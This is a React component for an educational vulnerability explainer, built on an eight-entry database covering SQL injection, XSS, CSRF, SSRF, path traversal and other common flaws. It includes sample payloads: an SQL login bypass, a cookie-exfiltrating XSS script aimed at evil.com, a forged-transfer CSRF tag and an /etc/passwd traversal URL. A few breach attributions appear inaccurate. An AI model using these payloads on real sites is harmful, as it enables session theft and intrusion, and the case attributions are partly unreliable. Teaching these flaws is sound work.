import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Search, Shield, AlertTriangle } from "lucide-react";

interface Vulnerability {
  id: string;
  name: string;
  aliases: string[];
  severity: "Critical" | "High" | "Medium" | "Low";
  category: string;
  description: string;
  impact: string;
  howItWorks: string;
  realWorldExample: string;
  mitigation: string[];
  references: string[];
}

const vulnDatabase: Vulnerability[] = [
  {
    id: "CWE-89", name: "SQL Injection", aliases: ["sqli", "sql injection"], severity: "Critical", category: "Injection",
    description: "SQL Injection occurs when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data tricks the interpreter into executing unintended commands or accessing unauthorized data.",
    impact: "Complete database compromise, data theft, data modification or deletion, authentication bypass, and in some cases, OS command execution.",
    howItWorks: "An attacker inserts SQL code into input fields (login forms, search bars, URL parameters). If the application concatenates user input directly into SQL queries without proper sanitization, the injected SQL executes with the application's database privileges.\n\nExample vulnerable code:\nSELECT * FROM users WHERE username = '" + "' OR '1'='1" + "' AND password = 'anything'\n\nThis always returns true, bypassing authentication.",
    realWorldExample: "The 2017 Equifax breach exposed 147 million records through an Apache Struts vulnerability. SQL injection remains the #1 injection attack type, responsible for countless data breaches.",
    mitigation: ["Use parameterized queries (prepared statements) — NEVER concatenate user input into SQL", "Use an ORM (Sequelize, Prisma, SQLAlchemy) which parameterizes by default", "Apply input validation and whitelist expected patterns", "Implement least-privilege database accounts", "Use Web Application Firewall (WAF) rules as defense-in-depth", "Regularly test with tools like sqlmap or Burp Suite"],
    references: ["OWASP: A03:2021 Injection", "CWE-89: SQL Injection", "NIST NVD"]
  },
  {
    id: "CWE-79", name: "Cross-Site Scripting (XSS)", aliases: ["xss", "cross site scripting"], severity: "High", category: "Injection",
    description: "XSS attacks occur when an application includes untrusted data in a web page without proper validation or escaping. This allows attackers to execute scripts in the victim's browser.",
    impact: "Session hijacking, cookie theft, keylogging, phishing, defacement, and malware distribution. Can lead to full account takeover.",
    howItWorks: "Three types:\n\n1. Reflected XSS: Malicious script is reflected off a web server (e.g., in search results, error messages)\n2. Stored XSS: Script is permanently stored on the target server (e.g., in comments, forum posts)\n3. DOM-based XSS: Vulnerability exists in client-side code rather than server-side\n\nExample: <script>document.location='https://evil.com/steal?c='+document.cookie</script>",
    realWorldExample: "In 2018, a stored XSS vulnerability in British Airways' website was exploited by the Magecart group, stealing payment data from 380,000 customers.",
    mitigation: ["Encode output — HTML-encode all user data before rendering", "Use Content Security Policy (CSP) headers", "Use modern frameworks (React, Vue) that auto-escape by default", "Sanitize HTML input with libraries like DOMPurify", "Set HttpOnly and Secure flags on cookies", "Validate and sanitize all user inputs on the server side"],
    references: ["OWASP: A03:2021 Injection", "CWE-79: Cross-site Scripting", "MDN: Content Security Policy"]
  },
  {
    id: "CWE-352", name: "Cross-Site Request Forgery (CSRF)", aliases: ["csrf", "xsrf", "cross site request forgery"], severity: "High", category: "Session",
    description: "CSRF forces an authenticated user to submit a request to a web application against which they are currently authenticated, without their knowledge or consent.",
    impact: "Unauthorized actions on behalf of the victim: changing email/password, making purchases, transferring funds, modifying data.",
    howItWorks: "The attacker crafts a malicious page containing a hidden form or image tag that triggers a request to the target application. When the victim visits this page while logged into the target app, the browser automatically includes their session cookies with the forged request.\n\nExample: <img src='https://bank.com/transfer?to=attacker&amount=10000' />",
    realWorldExample: "In 2008, a CSRF vulnerability in Netflix allowed attackers to change account details of any logged-in user by embedding a malicious form on a third-party website.",
    mitigation: ["Implement anti-CSRF tokens (synchronizer token pattern)", "Use SameSite cookie attribute (Lax or Strict)", "Verify Origin and Referer headers", "Require re-authentication for sensitive actions", "Use CORS properly to restrict cross-origin requests"],
    references: ["OWASP: A01:2021 Broken Access Control", "CWE-352: CSRF"]
  },
  {
    id: "CWE-287", name: "Broken Authentication", aliases: ["authentication bypass", "broken auth", "credential stuffing"], severity: "Critical", category: "Authentication",
    description: "Application functions related to authentication and session management are implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens.",
    impact: "Complete account takeover, identity theft, unauthorized access to sensitive data and functionality.",
    howItWorks: "Common attack vectors:\n\n1. Credential stuffing: Using leaked username/password pairs from other breaches\n2. Brute force: Systematic password guessing\n3. Session fixation: Forcing a known session ID onto a user\n4. Weak password recovery: Exploiting password reset flows\n5. Token theft: Stealing JWT or session tokens",
    realWorldExample: "The 2016 Uber breach compromised 57 million records when attackers found AWS credentials hardcoded in a GitHub repository, bypassing all authentication.",
    mitigation: ["Implement multi-factor authentication (MFA)", "Never ship default credentials", "Enforce strong password policies with breach checks (HaveIBeenPwned API)", "Implement account lockout with progressive delays", "Use secure session management (regenerate session IDs after login)", "Hash passwords with bcrypt, scrypt, or Argon2"],
    references: ["OWASP: A07:2021 Authentication Failures", "CWE-287: Improper Authentication", "NIST 800-63B: Digital Identity Guidelines"]
  },
  {
    id: "CWE-918", name: "Server-Side Request Forgery (SSRF)", aliases: ["ssrf", "server side request forgery"], severity: "High", category: "Injection",
    description: "SSRF occurs when an application fetches a remote resource based on a user-supplied URL without proper validation, allowing attackers to access internal services.",
    impact: "Access to internal services, cloud metadata endpoints (AWS IAM credentials), port scanning of internal networks, and potential remote code execution.",
    howItWorks: "The attacker supplies or modifies a URL that the server-side code reads or submits data to. By targeting internal addresses (localhost, 169.254.169.254 for cloud metadata, internal IPs), the attacker can:\n\n1. Read cloud credentials from metadata APIs\n2. Access internal admin panels\n3. Scan internal ports and services\n4. Bypass firewalls and access controls",
    realWorldExample: "The 2019 Capital One breach exploited an SSRF vulnerability in a WAF to access AWS metadata credentials, exposing 106 million customer records.",
    mitigation: ["Validate and sanitize all user-supplied URLs", "Use allowlists for permitted domains and IP ranges", "Block requests to private/internal IP ranges (10.x, 172.16-31.x, 192.168.x)", "Block cloud metadata endpoints (169.254.169.254)", "Use a dedicated HTTP client with timeout and redirect limits", "Implement network segmentation"],
    references: ["OWASP: A10:2021 SSRF", "CWE-918: Server-Side Request Forgery"]
  },
  {
    id: "CWE-502", name: "Insecure Deserialization", aliases: ["deserialization", "object injection", "pickle exploit"], severity: "Critical", category: "Data Integrity",
    description: "Insecure deserialization occurs when an application deserializes data from untrusted sources without proper validation, potentially leading to remote code execution.",
    impact: "Remote code execution, replay attacks, injection attacks, privilege escalation, and denial of service.",
    howItWorks: "When applications deserialize (reconstruct objects from serialized data) untrusted input, attackers can manipulate the serialized data to:\n\n1. Execute arbitrary code during deserialization\n2. Modify object properties to escalate privileges\n3. Inject malicious objects into the application\n\nCommon in: Java (ObjectInputStream), Python (pickle), PHP (unserialize), .NET (BinaryFormatter)",
    realWorldExample: "The 2017 Apache Struts vulnerability (CVE-2017-5638) exploited insecure deserialization of Content-Type headers, leading to the Equifax breach.",
    mitigation: ["Never deserialize untrusted data", "Use safe serialization formats (JSON) instead of native serialization", "Implement integrity checks (digital signatures) on serialized objects", "Enforce strict type constraints during deserialization", "Monitor and alert on deserialization exceptions", "Use look-ahead deserialization to validate object types before construction"],
    references: ["OWASP: A08:2021 Software and Data Integrity Failures", "CWE-502: Deserialization of Untrusted Data"]
  },
  {
    id: "CWE-22", name: "Path Traversal", aliases: ["directory traversal", "dot dot slash", "lfi", "local file inclusion"], severity: "High", category: "Access Control",
    description: "Path traversal attacks use special characters (../) to access files and directories stored outside the intended directory, potentially exposing sensitive system files.",
    impact: "Reading sensitive files (/etc/passwd, configuration files, source code), and in some cases writing files to arbitrary locations.",
    howItWorks: "The attacker manipulates file paths by injecting directory traversal sequences:\n\nVulnerable URL: https://app.com/files?name=report.pdf\nAttack: https://app.com/files?name=../../../etc/passwd\n\nThe server resolves the path and returns the system file instead of the intended document.",
    realWorldExample: "In 2020, a path traversal vulnerability in Citrix ADC (CVE-2019-19781) was widely exploited to access sensitive configuration files and achieve remote code execution.",
    mitigation: ["Validate user input against an allowlist of permitted file names", "Use a chroot jail or sandboxed file system", "Canonicalize paths and verify they remain within the intended directory", "Never use user input directly in file system operations", "Implement proper access controls on the file system level"],
    references: ["OWASP: A01:2021 Broken Access Control", "CWE-22: Path Traversal"]
  },
  {
    id: "CWE-312", name: "Sensitive Data Exposure", aliases: ["data exposure", "plaintext storage", "data leak"], severity: "High", category: "Cryptography",
    description: "When applications do not adequately protect sensitive data (financial data, PII, credentials) through encryption at rest and in transit, attackers can steal or modify the data.",
    impact: "Identity theft, financial fraud, regulatory violations (GDPR, HIPAA, PCI-DSS), and reputational damage.",
    howItWorks: "Common scenarios:\n\n1. Transmitting data over HTTP instead of HTTPS\n2. Storing passwords in plaintext or with weak hashing (MD5, SHA1)\n3. Using weak or outdated encryption algorithms\n4. Exposing sensitive data in logs, error messages, or URLs\n5. Improper key management (hardcoded keys, keys in source code)",
    realWorldExample: "In 2013, Adobe suffered a breach exposing 153 million user records with passwords encrypted using 3DES in ECB mode — an inadequate encryption method that made the passwords easily recoverable.",
    mitigation: ["Encrypt all data in transit using TLS 1.2+", "Hash passwords with Argon2, bcrypt, or scrypt", "Encrypt sensitive data at rest using AES-256", "Classify data and apply appropriate protection levels", "Never log sensitive data (PII, credentials, tokens)", "Use proper key management (HSM, vault, KMS)", "Implement HSTS headers to force HTTPS"],
    references: ["OWASP: A02:2021 Cryptographic Failures", "CWE-312: Cleartext Storage", "PCI DSS v4.0"]
  },
];

const severityColor: Record<string, string> = {
  Critical: "bg-destructive text-destructive-foreground",
  High: "bg-destructive/80 text-destructive-foreground",
  Medium: "bg-yellow-500 text-white",
  Low: "bg-muted text-muted-foreground",
};

const VulnExplainer = () => {
  const [search, setSearch] = useState("");
  const [selected, setSelected] = useState<Vulnerability | null>(null);

  const filtered = search.trim()
    ? vulnDatabase.filter(v =>
        v.name.toLowerCase().includes(search.toLowerCase()) ||
        v.id.toLowerCase().includes(search.toLowerCase()) ||
        v.aliases.some(a => a.includes(search.toLowerCase())) ||
        v.category.toLowerCase().includes(search.toLowerCase())
      )
    : vulnDatabase;

  return (
    <div className="space-y-6">
      <div className="relative">
        <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
        <Input
          placeholder="Search by name, CWE ID, or keyword (e.g., SQL injection, XSS, CSRF)..."
          value={search}
          onChange={e => { setSearch(e.target.value); setSelected(null); }}
          className="pl-9"
        />
      </div>

      {!selected ? (
        <div className="space-y-2">
          <p className="text-sm text-muted-foreground">{filtered.length} vulnerabilities</p>
          {filtered.map(v => (
            <button
              key={v.id}
              onClick={() => setSelected(v)}
              className="w-full text-left bg-card border rounded-lg p-4 hover:border-primary transition-colors"
            >
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <Shield className="h-5 w-5 text-primary shrink-0" />
                  <div>
                    <p className="font-semibold text-foreground">{v.name}</p>
                    <p className="text-xs text-muted-foreground">{v.id} · {v.category}</p>
                  </div>
                </div>
                <span className={`text-xs font-medium rounded-full px-2.5 py-0.5 ${severityColor[v.severity]}`}>{v.severity}</span>
              </div>
            </button>
          ))}
        </div>
      ) : (
        <div className="space-y-6">
          <Button variant="outline" size="sm" onClick={() => setSelected(null)}>← Back to list</Button>

          <div className="flex items-start justify-between">
            <div>
              <h2 className="text-xl font-bold text-foreground">{selected.name}</h2>
              <p className="text-sm text-muted-foreground">{selected.id} · {selected.category}</p>
            </div>
            <span className={`text-xs font-medium rounded-full px-2.5 py-0.5 ${severityColor[selected.severity]}`}>{selected.severity}</span>
          </div>

          <div className="bg-card border rounded-lg p-5 space-y-4">
            <div>
              <h3 className="font-semibold text-foreground mb-1">What Is It?</h3>
              <p className="text-sm text-muted-foreground">{selected.description}</p>
            </div>
            <div>
              <h3 className="font-semibold text-foreground mb-1">Impact</h3>
              <p className="text-sm text-muted-foreground">{selected.impact}</p>
            </div>
            <div>
              <h3 className="font-semibold text-foreground mb-1">How It Works</h3>
              <pre className="text-sm text-muted-foreground bg-muted rounded-lg p-4 whitespace-pre-wrap font-mono">{selected.howItWorks}</pre>
            </div>
            <div>
              <h3 className="font-semibold text-foreground mb-1">Real-World Example</h3>
              <p className="text-sm text-muted-foreground">{selected.realWorldExample}</p>
            </div>
            <div>
              <h3 className="font-semibold text-foreground mb-1 flex items-center gap-2"><AlertTriangle className="h-4 w-4 text-secondary" /> Mitigation Steps</h3>
              <ul className="text-sm text-muted-foreground space-y-1 ml-4">
                {selected.mitigation.map((m, i) => (
                  <li key={i} className="list-disc">{m}</li>
                ))}
              </ul>
            </div>
            <div>
              <h3 className="font-semibold text-foreground mb-1">References</h3>
              <ul className="text-sm text-muted-foreground space-y-1">
                {selected.references.map((r, i) => (
                  <li key={i} className="text-primary">{r}</li>
                ))}
              </ul>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default VulnExplainer;
